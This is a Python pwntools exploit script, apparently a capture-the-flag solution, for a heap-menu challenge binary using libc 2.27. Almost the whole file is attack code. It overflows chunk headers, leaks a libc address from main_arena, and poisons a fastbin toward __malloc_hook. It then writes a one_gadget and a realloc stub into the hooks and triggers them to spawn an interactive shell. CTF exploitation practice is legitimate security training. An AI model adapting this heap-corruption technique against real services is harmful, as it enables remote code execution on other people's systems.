#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11104 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 11103)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def create(size):
    io.sendlineafter('> ', '1')
    io.sendlineafter(':', str(size))

def edit(idx, ctx):
    io.sendlineafter('> ', '4')
    io.sendlineafter(':', str(idx))
    io.sendafter(':', ctx)

def view(idx):
    io.sendlineafter('> ', '3')
    io.sendlineafter(':', str(idx))

def copy(src,dst):
    io.sendlineafter('> ', '5')
    io.sendlineafter(':', str(src))
    io.sendlineafter(':', str(dst))

def delete(idx):
    io.sendlineafter('> ', '2')
    io.sendlineafter(':', str(idx))

libc = ELF("./libc-2.27.so")
# libc = exe.libc

main_arena_96 = 0x3ebca0
libc_one_gadget = 0x4f432
call_realloc = 0x98d70+14

create(0x30)  # 0
create(0x10)  # 1
create(0x400) # 2
create(0x100)  # 3

edit(3, (p64(0)+p64(0x21))*10 )

edit(0, "a"*0x18+p64(0x491))
copy(0, 1)

delete(2)

create(0x400) # 2

view(3)
io.recv()
leak = u64(io.recv(8))
print hex(leak)
libc.address = leak - main_arena_96
print hex(libc.address)

for i in range(8):
    create(0x68)
    delete(4)

create(0x10) # 4
create(0x68) # 5
delete(5)

p = "a"*0x20
p+= p64(libc.sym['__malloc_hook'] -0x23)
# p+= p64(libc.sym['__malloc_hook'])
edit(0, p)
copy(0, 4)

# fix size chunk
for i in range(7,0,-1):
    p = "a"*(0x18+i) + '\x00'
    edit(0, p)
    copy(0, 4)

p = "a"*0x18 + '\x71'
edit(0, p)
copy(0, 4)

create(0x68) # 5 junk
create(0x68) # 6
# #
print hex(libc.sym['__malloc_hook'])

off = [0x4f3d5,0x4f432,0x10a41c]
one_gadget = libc.address + off[2]

print hex(one_gadget)
p = '\x00'*0xb
p += p64(one_gadget)# realloc hook
p += p64(libc.address + call_realloc) # malloc hook
edit(6, p)

io.sendlineafter('> ', '1')
io.sendlineafter(': ', '123')

io.interactive()
